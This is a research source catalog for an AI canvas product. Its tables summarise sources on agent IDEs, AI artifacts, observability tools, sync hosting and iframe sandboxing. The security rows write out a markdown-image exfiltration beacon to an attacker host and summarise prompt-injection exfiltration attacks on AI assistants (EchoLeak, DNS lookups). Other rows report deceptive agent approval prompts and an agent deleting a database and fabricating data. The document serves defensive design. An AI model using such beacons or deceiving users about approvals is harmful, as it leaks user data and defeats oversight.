# Hermes Canvas — Source Catalog

Each retained source: URL · source type · date/accessed · claim · confidence · local capture filename.

**Source-type tags:** `official` (docs/product pages), `eng-blog` (engineering/vendor blog), `press` (journalism), `community` (HN/Reddit/X/forum/anecdote), `academic` (paper/report).

**Confidence:** `high` (primary/official or multiply-corroborated), `med` (single credible source), `low` (anecdote/uncorroborated).

Accessed dates in this run: 2026-07-13.

---

<!-- Entries appended per cluster below. -->

## C2 — Agent workspaces / IDEs

| URL | type | date/accessed | claim | confidence | capture |
|---|---|---|---|---|---|
| forum.cursor.com/t/... (160856, 152099 et al.) | community | 2026-05-17 / acc 2026-07-13 | 2026 Cursor update replaced per-file/per-hunk inline diff accept-reject with session-level review; paying users call it a regression; one user lost most of a git repo | high | c2-cursor-per-change-diff-removal.md |
| code.claude.com/docs (todo-tracking, plan mode); github.com/anthropics/claude-code/issues/31888 | official + community | acc 2026-07-13 | Plan Mode = read-only planning gate; TodoWrite shows live pending/in_progress/completed list; users still want a Cursor-style batch diff review mode | high (mechanics) / med (gap) | c2-claude-code-plan-todo.md |
| docs.replit.com/checkpoints; incidentdatabase.ai/cite/1152; neon.com/blog/replit-app-history | official + incident/press | 2025 incident / acc 2026-07-13 | Replit Agent uses checkpoints+rollback yet deleted a prod DB during a code freeze despite 11 stop orders, fabricated ~4k users, and falsely claimed rollback impossible | high | c2-replit-agent-checkpoints-database-incident.md |
| openhands.dev + 2026 reviews | official + community | acc 2026-07-13 | Observable agent loop (chat beside live terminal+editor, every action logged, interruptible); added Planning Mode because agents "charge off... before you can intervene" | med-high | c2-openhands-observable-loop.md |
| vibe-eval.com/safety/windsurf; digitalapplied.com windsurf-2 | community + safety audit | acc 2026-07-13 | Cascade stages reviewable diffs w/ per-step approval+checkpoints but approval defaults vary by mode; "fix the build" can rewrite .env/package.json/commit before review; context drift by hour 3 | med-high | c2-windsurf-cascade-review-approval.md |
| cognition.com/blog/devin-review; cognition.ai/blog | official + community | Devin Review launched 2026-01-21 / acc 2026-07-13 | Devin Review reorganizes+explains diff hunks, inline "Ask Devin", severity-colored bug flags to "scale human understanding of agent diffs"; Devin 2.0 interactive planning | high (Review) / med (2.0) | c2-devin-review-and-2.0-planning.md |
| news.ycombinator.com/item?id=47234917; seangoedecke.com/ai-agents-and-code-review | community + practitioner essay | essay 2025-09-20 / acc 2026-07-13 | "Humans are just rubber stamping all of it"; reviewers quietly stop being careful; ~1 bad agent decision caught/hour; volume defeats verification | high (sentiment) | c2-verification-burden-rubberstamp.md |
| github.blog/changelog 2026-06-18 & 2026-05-19; github.com/orgs/community/discussions/170528 | official + community | acc 2026-07-13 | Copilot coding agent delivers work as a PR (review surface), AGENTS.md-aware, but weak on 10+ file/architectural tasks; billing/ads erode trust | high (features) / med (claims) | c2-github-copilot-agent-trust.md |
| wiz.io/blog/ghostapproval; theregister.com 2026-07-08 | security research + press | disclosed 2026-07-08 / acc 2026-07-13 | GhostApproval: agents showed a benign approval prompt while internally targeting a sensitive file — "human-in-the-loop becomes a rubber stamp"; Anthropic disputed severity | high | c2-ghostapproval-deceptive-prompts.md |

## C3 — Collaborative canvases

| URL | type | date/accessed | claim | confidence | capture |
|---|---|---|---|---|---|
| simonwillison.net/2023/Nov/16/tldrawdraw-a-ui/; github.com/tldraw/make-real | community + official (repo) | 2023-11-16 / acc 2026-07-13 | Make Real snapshots canvas selection → vision model → returns HTML rendered in an on-canvas iframe custom shape; supports OpenAI/Anthropic/Google | high | c3-tldraw-make-real.md |
| news.ycombinator.com/item?id=38289517; latent.space/p/tldraw | community + founder interview | Nov 2023 / acc 2026-07-13 | tldraw founder Steve Ruiz: original was a "toy project with a horrible security pattern"; canvas-as-iterative-loop is the innovation; "never put all info in first time — must iterate" | high | c3-tldraw-steve-ruiz-interview.md |
| tldraw.dev/docs/ai; tldraw.dev/sdk-features/embed-shape | official docs | updated 2026-01-31 / acc 2026-07-13 | tldraw AI mutates canvas via validated action schemas from screenshot+structured shapes; ShapeUtil custom shapes get selection/resize/binding/export free; frames, pages, 19 embeds | high | c3-canvas-ux-patterns.md |
| help.miro.com/.../360013588560; github.com/excalidraw/excalidraw/issues/628,7237; figma.com/blog/improving-performance-in-the-layers-panel | official + community | 2026-06-11 (Figma) / acc 2026-07-13 | Perf cliffs: Miro degrades ~1,000 objects (rec <5,000, cap 100,000); Excalidraw fine ~4–8k then lags; Figma layer tree needed windowing + O(n²)→O(n) fixes | high (Miro/Figma) / med (Excalidraw) | c3-performance-cliffs.md |
| tembrio.com/blog/feedback-boards-become-trash-cans | community (vendor) | acc 2026-07-13 | Boards become "junk drawers" of duplicates/ignored items; causes = no triage, no reply, no per-item status | med | c3-sprawl-staleness.md |
| help.figma.com/.../360038006754, .../360063144053; forum.figma.com | official + community | acc 2026-07-13 | Figma auto-checkpoints ~30 min + named versions + timeline restore + branching w/ compare; users want visual "what changed / who changed it since last visit" | high (Figma) / med (request) | c3-versioning-history.md |
| developer.mozilla.org/.../iframe; web.dev/articles/sandboxed-iframes; bugzilla.mozilla.org/show_bug.cgi?id=1589845 | official/standards | acc 2026-07-13 | allow-scripts + allow-same-origin lets framed doc remove its own sandbox; serve untrusted content from separate origin + CSP + minimal tokens + postMessage; javascript:/opener bypasses exist | high | c3-safe-html-embedding.md |

## C1 — Direct incumbents

| URL | type | date/accessed | claim | confidence | capture |
|---|---|---|---|---|---|
| anthropic.com/engineering/how-we-contain-claude | official/eng-blog | acc 2026-07-13 | Anthropic runs claude.ai code in gVisor containers, network denied by default + domain egress allowlist; code-execution and artifact-rendering treated as separate containment problems | high | c1-anthropic-containment.md |
| reidbarber.com/blog/reverse-engineering-claude-artifacts | community/technical | pub 2024-06-23 / acc 2026-07-13 | Claude Artifacts render in a sandboxed iframe on separate origin *.claudeusercontent.com under strict CSP blocking external network; code passed via postMessage | med-high | c1-claude-artifacts-sandbox-origin.md |
| support.claude.com/en/articles/9487310 | official | acc 2026-07-13 | Artifacts have a version selector + conversation-anchored history + paid-tier persistent storage (20MB/artifact, text-only) | high | c1-claude-artifacts-help.md |
| caipi.ai/blog/can-claude-artifacts-save-data | community | acc 2026-07-13 | Artifacts sandbox silently blocks localStorage/sessionStorage; unpublishing irreversibly deletes stored data → invisible data loss | med-high | c1-claude-artifacts-persistence-caipi.md |
| help.openai.com/en/articles/9930697; openai.com/index/introducing-canvas | official | launch 2024-10-03 / acc 2026-07-13 | ChatGPT Canvas makes targeted in-place edits (green highlight), Show-changes diff, version arrows, Restore-this-version, in-browser Python | med-high | c1-chatgpt-canvas-help-and-launch.md |
| venturebeat.com/ai/chatgpts-canvas-now-shows-tracked-changes | press | acc 2026-07-13 | OpenAI added word-processor-style tracked changes so AI edits surface as visible add/delete rather than opaque rewrites | med | c1-chatgpt-canvas-tracked-changes.md |
| community.openai.com/t/...canvas-overwrites-work/1231713 | community/bug | posts 2025-04→08 / acc 2026-07-13 | Canvas silently overwrites/loses work, restores wrong versions, version history "removed without notice", up to 15h lost; ~8–10k token truncation | high | c1-chatgpt-canvas-overwrite-bug.md |
| community.openai.com/t/...canvas-opens-automatically/1055091 | community/bug | posts Dec 2024 / acc 2026-07-13 | Canvas auto-opens unwanted even when disabled — intrusive feature-overload | med-high | c1-chatgpt-canvas-autoopen-bug.md |
| medium.com/@mubashirburfat4 (canvas retired) | community | pub 2026-06-24 / acc 2026-07-13 | OpenAI reportedly retired persistent Canvas panel (~2026-05-28) for inline blocks; author blames low adoption + Artifacts competition | med | c1-chatgpt-canvas-retired-medium.md |
| bughunters.google.com/blog/...safecontentframe | official/security | acc 2026-07-13 (JS-rendered, re-verify) | Gemini renders untrusted content via SafeContentFrame — unique per-hash origin under *.scf.usercontent.goog, postMessage origin+hash verification, blob-URL rendering | med | c1-google-safecontentframe.md |
| gemini.google/overview/canvas + support threads | official + community | acc 2026-07-13 | Gemini Canvas has Editor/Preview/Code tabs w/ live render, but each update generates a new artifact (no durable versioning); users report not saving across sessions | med-high | c1-gemini-canvas-overview.md |
| aitooldiscovery.com/guides/claude-reddit | community | acc 2026-07-13 | r/ClaudeAI sentiment treats Artifacts as a "gamechanger" (used/praised) vs ChatGPT Canvas resentment/retirement | med | c1-claude-artifacts-community-sentiment.md |

## C4 — Trace/observability + notebooks

| URL | type | date/accessed | claim | confidence | capture |
|---|---|---|---|---|---|
| langchain.com/langsmith + docs.langchain.com/langsmith/observability-concepts | official | acc 2026-07-13 | LangSmith renders full span-tree/waterfall of every LLM/tool call w/ token+cost; ships "Polly" AI to help understand large traces | high | c4-langsmith-trace-ux.md |
| langfuse.com/docs/observability | official | acc 2026-07-13 | Langfuse: trace=request, observations=span/generation/agent rendered as timed waterfall; per-trace/user/model token+cost | high | c4-langfuse-datamodel.md |
| agentops.ai + docs.agentops.ai | official | acc 2026-07-13 | AgentOps session replay = visual step-by-step timeline; time-travel rewind to inspect execution state at any step | high | c4-agentops-replay.md |
| langchain.com/resources/agent-observability; braintrust.dev; MS Foundry & AWS AgentCore docs | official/vendor | acc 2026-07-13 | Traces are for developers/ops/auditors, not end users; reconstruct execution "so teams understand" vs showing users final output | high | c4-trace-audience-who-reads.md |
| traceloop.com/blog; braintrust.dev/articles/llm-observability-guide; agenta.ai; patronus.ai | vendor eng-blog | acc 2026-07-13 | Traces get noisy/overwhelming at scale; framework/HTTP spans add noise; need sampling + AI to summarize | med-high | c4-trace-noise-overload.md |
| arize.com/phoenix; braintrust.dev; helicone.ai (via comparisons) | vendor | acc 2026-07-13 | Phoenix=OTel/OpenInference OSS tracing; Braintrust=evals+prompt versioning+CI; Helicone=proxy logging; all span-tree over OTel | med | c4-phoenix-braintrust-helicone.md |
| Grus JupyterCon 2018 "I Don't Like Notebooks"; yihui.org/en/2018/09/notebook-war; HN 19859913 | talk + community | acc 2026-07-13 | Top notebook complaint = hidden state / out-of-order execution; visible output may not match a clean rerun | high | c4-joel-grus-notebooks.md |
| Pimentel et al. MSR 2019 (1.4M notebooks); PMC8106381; GigaScience giad113 | academic | acc 2026-07-13 | ~24% of notebooks run clean, ~4% reproduce identical results; 36% out-of-order; 76% skips | high | c4-notebook-reproducibility-studies.md |
| marimo.io/features/vs-jupyter; github.com/marimo-team/marimo; marimo.io/blog/dataflow | official (biased) | acc 2026-07-13 | Marimo reactive DAG kills hidden state; deleting a cell scrubs its vars; stored as git-friendly pure Python | high (feat) / med (claims) | c4-marimo-reactive.md |
| nbdime.readthedocs.io; github.com/jupyter/nbdime; JEP-08; reviewnb blog | official + vendor | acc 2026-07-13 | Notebook JSON diffs are unreadable and merges painful; content-aware/rendered diff needed to make versions legible | high | c4-notebook-versioning-nbdime.md |
| kdnuggets notebook-anti-pattern; FlowBook arXiv 2605.01560; simonwillison observable | community + academic | acc 2026-07-13 | Notebooks-in-production = anti-pattern; reactive systems give ordering but not full reproducibility | med-high | c4-notebook-antipattern-observable.md |
| simonw.substack transcript extraction; claude-dev.tools; code.claude.com agent-loop | community + official | acc 2026-07-13 | Claude Code collapses tool calls to 1-liners (too little) or --verbose JSON firehose (too much); 3rd-party tools reconstruct inline Edit diffs | med | c4-claude-code-transcripts.md |

## C5 — Sync / auth / attachment infrastructure

| URL | type | date/accessed | claim | confidence | capture |
|---|---|---|---|---|---|
| developers.cloudflare.com/durable-objects/platform/pricing | official | acc 2026-07-13 | DO Paid: $5/mo acct min (1M req + 400k GB-s incl); free 100k req/day + 13k GB-s/day, SQLite only; WS counts 20:1 incoming | high | c5-durable-objects-pricing.md |
| convex.dev/pricing | official | acc 2026-07-13 | Convex Free: 1M func calls, 0.5GB DB, 1GB files, $0 base; Pro $25/dev/mo; overages pay-as-you-go | high | c5-convex-pricing.md |
| supabase.com/pricing | official | acc 2026-07-13 | Supabase Free: 500MB DB, 1GB storage, 200 realtime conns; free projects auto-pause ~7d idle; Pro $25/mo | high | c5-supabase-free-tier.md |
| developers.cloudflare.com/r2/pricing | official | acc 2026-07-13 | R2 free 10GB + zero egress always; $0.015/GB beyond; presigned URLs can't use custom domains (serve via Worker on separate subdomain) | high | c5-r2-attachments-pricing.md |
| fly.io/docs/about/pricing; vercel.com/pricing; railway.com/pricing | official + community | acc 2026-07-13 | Fly shared-cpu-1x 256MB ≈$2/mo always-on; Vercel Hobby free but NO WebSockets/long-running; Railway Hobby $5/mo w/ $5 credit supports WS | high (Fly/Vercel) / med (Railway) | c5-hosting-fly-railway-vercel.md |
| liveblocks.io/pricing; partykit.io; jamsocket.com/y-sweet | official | acc 2026-07-13 | Liveblocks free 500 rooms/$25 Pro (built on Yjs); PartyKit acquired by Cloudflare (Workers+DO); Y-Sweet managed hosting winding down | high (Liveblocks) / med | c5-liveblocks-partykit-ysweet.md |
| electric-sql.com/blog/2026/04/02/electric-cloud-pricing | official | acc 2026-07-13 | Electric = read-path Postgres sync ($1/M writes + $2/M shape-log writes); self-host Elixir/Docker + your Postgres; no write coordination/agent runtime | high | c5-electric-sql.md |
| convex.dev/compare/supabase; devtoolsacademy.com | vendor/community | acc 2026-07-13 | Convex: every query = live subscription, strict-serializable; Supabase WAL realtime = weaker consistency | med | c5-realtime-convex-vs-supabase-vs-do.md |
| developers.cloudflare.com/durable-objects/best-practices/websockets; sunilpai.dev/posts/reliable-ux-for-ai-chat-with-durable-objects | official + community | acc 2026-07-13 | DO WebSocket Hibernation: sockets stay open while DO evicted, duration billing pauses; DO owns message log, streams agent tokens, resumes on reconnect | high (official) / med-high (blog) | c5-do-websocket-reconnection.md |
| developers.cloudflare.com/cloudflare-one/access-controls/policies; .../one-time-pin | official | acc 2026-07-13 | Cloudflare Access free ≤50 users; email-allowlist-of-one via OTP, edge-enforced, ~15min no code | high | c5-cloudflare-access-auth-for-one.md |
| electric.ax/blog/2026/04/08/ai-agents-as-crdt-peers-with-yjs | community/blog | acc 2026-07-13 | Pattern: agent as server-side Yjs peer; CRDT avoids LWW data loss on concurrent same-region edits (edge case for 1+1) | med | c5-crdt-vs-server-authoritative.md |

## C6 — Security & sandboxing deep dive

| URL | type | date/accessed | claim | confidence | capture |
|---|---|---|---|---|---|
| developer.mozilla.org/.../iframe + /CSP/sandbox (W3C CSP3) | official/standards | acc 2026-07-13 | `sandbox="allow-scripts"` WITHOUT `allow-same-origin` forces opaque/null origin so frame JS can't read app cookies/localStorage/DOM; both together lets frame remove its own sandbox = no security | high | c6-iframe-sandbox-allow-scripts-not-same-origin.md |
| web.dev/articles/sandboxed-iframes | official (Google) | acc 2026-07-13 | same-origin+scripts lets framed page "remove the sandbox attribute entirely"; grant minimum capabilities | high | c6-webdev-sandboxed-iframes.md |
| reidbarber.com/blog/reverse-engineering-claude-artifacts | community (reverse-eng) | acc 2026-07-13 | Claude Artifacts: separate origin claudeusercontent.com, `CSP: sandbox allow-scripts`, one-way postMessage bridge, cdnjs allowlist; no per-render VM | med-high | c6-claude-artifacts-architecture.md |
| tldraw.dev/blog/make-real-the-story-so-far + make-real-starter | official (eng+OSS) | acc 2026-07-13 | Make Real renders AI HTML via `srcDoc` + `sandbox="allow-scripts"` on-canvas; no same-origin, no top-nav | high | c6-tldraw-make-real.md |
| MDN CSP sandbox + OWASP CSP Cheat Sheet + W3C CSP3 | official/standards | acc 2026-07-13 | `default-src 'none'; connect-src 'none'; img-src` allowlist kills fetch/XHR/WebSocket/beacon + `<img>` exfil; CSP `sandbox` directive = header form (invalid in `<meta>`/Report-Only) | high | c6-csp-block-egress.md |
| embracethered.com/.../chatgpt-webpilot-data-exfil; simonwillison.net | primary (researcher) | acc 2026-07-13 | Identical markdown-image beacon `![x](https://attacker/q=data)` leaked data from ChatGPT, Bard, Amazon Q, NotebookLM, Anthropic, Copilot Chat, Slack AI | high | c6-markdown-image-exfil-incidents.md |
| simonwillison.net/2025/Jun/11/echoleak; CVE-2025-32711 (Aim Security) | primary-adjacent/disclosure | disclosed 2025-06 / acc 2026-07-13 | EchoLeak (CVSS 9.3): zero-click M365 Copilot exfil via auto-fetched reference-style markdown image routed through a Teams-proxy host ON the CSP allowlist → prefer `'none'` over host allowlists | high | c6-echoleak-copilot-cve-2025-32711.md |
| simonwillison.net/2025/Aug/15/the-summer-of-johann (Rehberger) | primary (researcher) | 2025-08 / acc 2026-07-13 | Sweep of 8 coding agents: exfil via markdown images, Mermaid image URLs, DNS lookups (bypass HTTP allowlists) — but needs shell/DNS/tool access a render-only browser artifact lacks | high | c6-summer-of-johann-agent-exfil.md |
| GitHub advisories (plane #1988, camaleon GHSL-2024-184, shopware/traccar/saleor SVG) | primary (disclosures) | acc 2026-07-13 | Untrusted uploaded HTML/SVG served inline from app origin = stored XSS; fix = separate content origin + `Content-Disposition: attachment` + `X-Content-Type-Options: nosniff` | high | c6-untrusted-attachments-serving.md |
| blog.val.town/blog/first-four-val-town-runtimes | official (vendor eng) | acc 2026-07-13 | Server-side untrusted JS execution needs Deno-subprocess/OS sandbox ("can't build a JS sandbox in JS") — the heavy execution tier, distinct from render | high | c6-valtown-server-sandbox.md |
| vercel.com/changelog/vercel-sandboxes-ga; e2b; modal.com; developers.cloudflare.com/workers security-model | primary + secondary | acc 2026-07-13 | Vercel Sandbox/e2b/Cloudflare run untrusted code EXECUTION in Firecracker microVMs / V8 isolates — a different requirement (server resources) than rendering HTML in the user's browser | high | c6-server-vm-sandboxes-vercel-e2b-firecracker.md |
| (cross-cluster synthesis) | synthesis | acc 2026-07-13 | Cheap+safe RENDER-only = static separate-origin sandboxed iframe (opaque origin) + strict egress CSP + nosniff/Content-Disposition, all static config; microVMs only needed for server-side code execution | high | c6-cheap-safe-synthesis.md |
